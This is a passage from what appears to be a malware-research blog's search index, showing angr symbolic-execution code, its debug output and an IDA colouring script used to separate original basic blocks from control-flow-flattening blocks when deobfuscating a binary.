t{hex(project.factory.successors(new_state)[0].addr)}&quot;) print(f&quot; t{hex(project.factory.successors(new_state)[1].addr)}&quot;) flag_depends_on_state = False for next_bb in project.factory.successors(new_state): print(f&quot;Constraints {hex(next_bb.addr)}:&quot;) for constraint in next_bb.solver.constraints: print(f&quot; t{constraint}&quot;) for v in constraint.variables: if &#39;reg_&#39;+ state_register in v: flag_depends_on_state = True print(f&quot; t t Depends on STATE&quot;) # If the constraint is an == this means next_bb must be an obb # Preemptively add it to the bb_states if constraint.op == &#39;__eq__&#39;: print(f&quot; t t **Equals STATE next bb must be obb&quot;) next_bb_addr = next_bb.addr next_bb_end = next_bb_addr + next_bb.block().size # make sure not to re-label stuff this is sort of like an alread seen list too if next_bb_addr not in bb_states: print(f&quot; t t ++ adding obb label&quot;) bb_states[next_bb_addr] = {&#39;is_obb&#39;:True, &#39;end&#39;:next_bb_end} else: print(f&quot; t t !! bb already labeled !!&quot;) # If the branch depends on state then this is a cf block if flag_depends_on_state: bb_states[bb_address] = {&#39;is_obb&#39;:False, &#39;end&#39;:bb_end_address} prev_bb_is_obb = False print(f&quot;Control flow depends on STATE - must be cf&quot;) else: # use previous state bb_states[bb_address] = {&#39;is_obb&#39;:prev_bb_is_obb, &#39;end&#39;:bb_end_address} print(f&quot;Control does not depend on STATE - keep previouse state {prev_bb_is_obb}&quot;) else: print(f&quot;Already labeled bb - skipping!&quot;) # Set the next prev state based on the saved one if bb_states[bb_address].get(&#39;is_obb&#39;): prev_bb_is_obb = True else: prev_bb_is_obb = False # new_state = project.factory.blank_state(addr=bb_address) # new_state.options.add(angr.options.CALLLESS) # Mark this bb as visited bb_visited.add(bb_address) # Use successors to push next bb on queue for next_bb in project.factory.successors(new_state): next_address = next_bb.addr if next_address not in bb_visited: if next_bb.regs.get(state_register).uninitialized: bb_info = {&#39;address&#39;:next_address, &#39;prev_is_obb&#39;:prev_bb_is_obb, &#39;state&#39;:next_bb} else: # Reset it all new_next_bb = project.factory.blank_state(addr=next_address) new_next_bb.options.add(angr.options.CALLLESS) bb_info = {&#39;address&#39;:next_address, &#39;prev_is_obb&#39;:prev_bb_is_obb, &#39;state&#39;:new_next_bb} q.put(bb_info) print(&quot;========================&quot;) print(&quot;DONE!&quot;) . BB: 0x10008784 BB end:0x10008914 Only one successor: 0x10008914 Previous bb was obb this one is too ======================== BB: 0x10008914 BB end:0x10008aa1 Only one successor: 0x10008aa1 Previous bb was obb this one is too ======================== BB: 0x10008aa1 BB end:0x10008c31 Only one successor: 0x10008c31 Previous bb was obb this one is too ======================== BB: 0x10008c31 BB end:0x10008dbb Only one successor: 0x10008dbb Previous bb was obb this one is too ======================== BB: 0x10008dbb BB end:0x10008f47 Only one successor: 0x10008f47 Previous bb was obb this one is too ======================== BB: 0x10008f47 BB end:0x100090d0 Only one successor: 0x100090d0 Previous bb was obb this one is too ======================== BB: 0x100090d0 BB end:0x1000925d Only one successor: 0x1000925d Previous bb was obb this one is too ======================== BB: 0x1000925d BB end:0x100093e6 Only one successor: 0x100093e6 Previous bb was obb this one is too ======================== BB: 0x100093e6 BB end:0x10009555 Multiple successors 0x10009555 0x10009894 Constraints 0x10009555: &lt;Bool reg_esi_105_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_107_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_108_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE Constraints 0x10009894: &lt;Bool reg_esi_105_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_107_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_108_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009555 BB end:0x1000955b Multiple successors 0x10009863 0x1000955b Constraints 0x10009863: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 == 0x0&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x1000955b: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009894 BB end:0x100098a0 Multiple successors 0x100099c1 0x100098a0 Constraints 0x100099c1: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0x9a37631&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x100098a0: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009863 BB end:0x1000988a Already labeled bb - skipping! ======================== BB: 0x1000955b BB end:0x10009563 Multiple successors 0x100097cd 0x10009563 Constraints 0x100097cd: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0x3db060f&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x10009563: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x100099c1 BB end:0x100099d2 Already labeled bb - skipping! ======================== BB: 0x100098a0 BB end:0x100098a4 Multiple successors 0x100098e8 0x100098a4 Constraints 0x100098e8: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0xabd1e15&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x100098a4: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xabd1e15&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x1000988a BB end:0x10009894 Only one successor: 0x1000953a Previous bb was obb this one is too ======================== BB: 0x100097cd BB end:0x100097e6 Already labeled bb - skipping! ======================== BB: 0x10009563 BB end:0x1000956f Multiple successors 0x10009713 0x1000956f Constraints 0x10009713: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0x3fd6f7a&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x1000956f: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3fd6f7a&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009549 BB end:0x10009555 Multiple successors 0x10009555 0x10009894 Constraints 0x10009555: &lt;Bool reg_ebx_124_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE Constraints 0x10009894: &lt;Bool reg_ebx_124_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x100098e8 BB end:0x10009904 Already labeled bb - skipping! ======================== BB: 0x100098a4 BB end:0x100098ac Multiple successors 0x100098ac 0x100099c6 Constraints 0x100098ac: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xabd1e15&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0xe571e86&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x100099c6: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xabd1e15&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xe571e86&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x1000953a BB end:0x10009555 Multiple successors 0x10009555 0x10009894 Constraints 0x10009555: &lt;Bool reg_ebx_133_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE Constraints 0x10009894: &lt;Bool reg_ebx_133_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x100097e6 BB end:0x10009830 Only one successor: 0x10009830 Previous bb was obb this one is too ======================== BB: 0x10009713 BB end:0x10009732 Already labeled bb - skipping! ======================== BB: 0x1000956f BB end:0x10009573 Multiple successors 0x100095a9 0x10009573 Constraints 0x100095a9: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3fd6f7a&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0x8d4442d&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x10009573: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3fd6f7a&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x8d4442d&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009904 BB end:0x1000998c Only one successor: 0x1000998c Previous bb was obb this one is too ======================== BB: 0x100098ac BB end:0x100098d8 Already labeled bb - skipping! ======================== BB: 0x100099c6 BB end:0x100099d2 Multiple successors 0x100099d2 0x10009549 Constraints 0x100099d2: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xabd1e15&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xe571e86&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0xd886856&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x10009549: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xabd1e15&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xe571e86&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xd886856&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009830 BB end:0x1000985b Only one successor: 0x1000985b Previous bb was obb this one is too ======================== BB: 0x10009732 BB end:0x10009750 Only one successor: 0x10009750 Previous bb was obb this one is too ======================== BB: 0x100095a9 BB end:0x100095c2 Already labeled bb - skipping! ======================== BB: 0x10009573 BB end:0x1000957b Multiple successors 0x1000957b 0x100099c6 Constraints 0x1000957b: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3fd6f7a&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x8d4442d&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0x9005e79&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x100099c6: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3fd6f7a&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x8d4442d&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9005e79&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x1000998c BB end:0x10009998 Multiple successors 0x10009998 0x1000999f Constraints 0x10009998: &lt;Bool reg_eax_297_32{UNINITIALIZED} == mem_7fff015c_298_32{UNINITIALIZED}&gt; Constraints 0x1000999f: &lt;Bool reg_eax_297_32{UNINITIALIZED} != mem_7fff015c_298_32{UNINITIALIZED}&gt; Control does not depend on STATE - keep previouse state True ======================== BB: 0x100098d8 BB end:0x100098e8 This is an end block ======================== BB: 0x100099d2 BB end:0x100099d7 Already labeled bb - skipping! ======================== BB: 0x1000985b BB end:0x10009863 Only one successor: 0x100096fa Previous bb was obb this one is too ======================== BB: 0x10009750 BB end:0x1000977e Only one successor: 0x1000977e Previous bb was obb this one is too ======================== BB: 0x100095c2 BB end:0x100095e3 Only one successor: 0x100095e3 Previous bb was obb this one is too ======================== BB: 0x1000957b BB end:0x10009595 Already labeled bb - skipping! ======================== BB: 0x10009998 BB end:0x1000999f Only one successor: 0x100099a4 Previous bb was obb this one is too ======================== BB: 0x1000999f BB end:0x100099ba Only one successor: 0x100099ba Previous bb was obb this one is too ======================== BB: 0x100098db BB end:0x100098e8 This is an end block ======================== BB: 0x100096fa BB end:0x10009713 Only one successor: 0x100099c6 Previous bb was obb this one is too ======================== BB: 0x1000977e BB end:0x100097af Only one successor: 0x100097af Previous bb was obb this one is too ======================== BB: 0x100095e3 BB end:0x10009615 Only one successor: 0x10009615 Previous bb was obb this one is too ======================== BB: 0x10009595 BB end:0x100095a9 Only one successor: 0x1000953a Previous bb was obb this one is too ======================== BB: 0x100099a4 BB end:0x100099ba Only one successor: 0x100099ba Previous bb was obb this one is too ======================== BB: 0x100099ba BB end:0x100099c1 Only one successor: 0x100096fa Previous bb was obb this one is too ======================== BB: 0x100097af BB end:0x100097c5 Only one successor: 0x100097c5 Previous bb was obb this one is too ======================== BB: 0x10009615 BB end:0x100096a2 Only one successor: 0x100096a2 Previous bb was obb this one is too ======================== BB: 0x100099ba BB end:0x100099c1 Already labeled bb - skipping! ======================== BB: 0x100097c5 BB end:0x100097cd Only one successor: 0x100096f5 Previous bb was obb this one is too ======================== BB: 0x100096a2 BB end:0x100096d6 Only one successor: 0x100096d6 Previous bb was obb this one is too ======================== BB: 0x100096f5 BB end:0x10009713 Only one successor: 0x100099c6 Previous bb was obb this one is too ======================== BB: 0x100096d6 BB end:0x100096f2 Only one successor: 0x100096f2 Previous bb was obb this one is too ======================== BB: 0x100096f2 BB end:0x10009713 Only one successor: 0x100099c6 Previous bb was obb this one is too ======================== DONE! . # If there is a jmp to the middle of a bb angr doesn&#39;t split it into two bb, this causes issues where a &quot;single&quot; bb # in the view of anger is actually two different types of bb # To normalize these what we need to do is split the bottom parts off the any non-normalized bb and set the type of # the top part of the block to be the same as the previous block # Sort the bb by address bb_states_sorted = {key:bb_states[key] for key in sorted(bb_states.keys())} # For each bb search for bb that end after it and truncate them # Also update their type to match the previous type for bb_address in bb_states_sorted: for ptr in bb_states_sorted: if ptr &gt;= bb_address: # We have passed our bb, not more potential unnormalized bb for this address break if bb_address &lt; bb_states_sorted[ptr].get(&#39;end&#39;): # Truncate the block bb_states_sorted[ptr][&#39;end&#39;] = bb_address # Update block type using previous block for prev_addr in bb_states_sorted: if ptr == bb_states_sorted[prev_addr].get(&#39;end&#39;): bb_states_sorted[ptr][&#39;is_obb&#39;] = bb_states_sorted[prev_addr].get(&#39;is_obb&#39;) break bb_states_sorted . {268470148: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548}, 268470548: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470945}, 268470945: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471345}, 268471345: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471739}, 268471739: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472135}, 268472135: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472528}, 268472528: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472925}, 268472925: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473318}, 268473318: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473658}, 268473658: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473673}, 268473673: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473685}, 268473685: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473691}, 268473691: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473699}, 268473699: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473711}, 268473711: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473715}, 268473715: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473723}, 268473723: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473749}, 268473749: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473769}, 268473769: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473794}, 268473794: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473827}, 268473827: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473877}, 268473877: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474018}, 268474018: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474070}, 268474070: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474098}, 268474098: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474101}, 268474101: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474106}, 268474106: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474131}, 268474131: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474162}, 268474162: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474192}, 268474192: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474238}, 268474238: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474287}, 268474287: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474309}, 268474309: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474317}, 268474317: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474342}, 268474342: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474416}, 268474416: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474459}, 268474459: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474467}, 268474467: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474506}, 268474506: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474516}, 268474516: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474528}, 268474528: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474532}, 268474532: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474540}, 268474540: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474584}, 268474584: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474587}, 268474587: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474600}, 268474600: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474628}, 268474628: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474764}, 268474764: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474776}, 268474776: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474783}, 268474783: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474788}, 268474788: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474810}, 268474810: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474817}, 268474817: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474822}, 268474822: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474834}, 268474834: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474839}} . Label The IDA Basic Blocks . import idaapi import idautils import idc from queue import Queue import struct bb_states = {268470148: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548}, 268470548: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470945}, 268470945: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471345}, 268471345: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471739}, 268471739: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472135}, 268472135: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472528}, 268472528: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472925}, 268472925: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473318}, 268473318: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473658}, 268473658: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473673}, 268473673: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473685}, 268473685: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473691}, 268473691: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473699}, 268473699: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473711}, 268473711: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473715}, 268473715: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473723}, 268473723: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473749}, 268473749: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473769}, 268473769: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473794}, 268473794: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473827}, 268473827: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473877}, 268473877: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474018}, 268474018: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474070}, 268474070: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474098}, 268474098: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474101}, 268474101: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474106}, 268474106: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474131}, 268474131: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474162}, 268474162: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474192}, 268474192: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474238}, 268474238: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474287}, 268474287: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474309}, 268474309: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474317}, 268474317: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474342}, 268474342: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474416}, 268474416: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474459}, 268474459: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474467}, 268474467: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474506}, 268474506: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474516}, 268474516: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474528}, 268474528: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474532}, 268474532: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474540}, 268474540: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474584}, 268474584: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474587}, 268474587: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474600}, 268474600: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474628}, 268474628: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474764}, 268474764: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474776}, 268474776: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474783}, 268474783: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474788}, 268474788: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474810}, 268474810: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474817}, 268474817: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474822}, 268474822: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474834}, 268474834: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474839}} def set_bb_color(ea_start, ea_end, color_value): ea_end = prev_head(ea_end) ptr = ea_start while ptr &lt;= ea_end : set_color(ptr, CIC_ITEM, color_value) ptr = next_head(ptr) for b in bb_states: print(f&quot;{hex(b)} - {hex(bb_states[b].get(&#39;end&#39;))}: {bb_states[b].get(&#39;is_obb&#39;)}&quot;) if bb_states[b].get(&#39;is_obb&#39;): set_bb_color(b, bb_states[b].get(&#39;end&#39;), 0x00ff00) else: set_bb_color(b, bb_states[b].get(&#39;end&#39;), 0x00A5ff) .",
            "url": "https://research.openanalysis.net/angr/symbolic%20execution/deobfuscation/research/2022/04/13/symbolic_execution_basics.html",
            "relUrl": "/angr/symbolic%20execution/deobfuscation/research/2022/04/13/symbolic_execution_basics.html",
            "date": " ‚Ä¢ Apr 13, 2022"
        }
        
    
  
    
        ,"post55": {
            "title": "Emotet Deobfuscation",
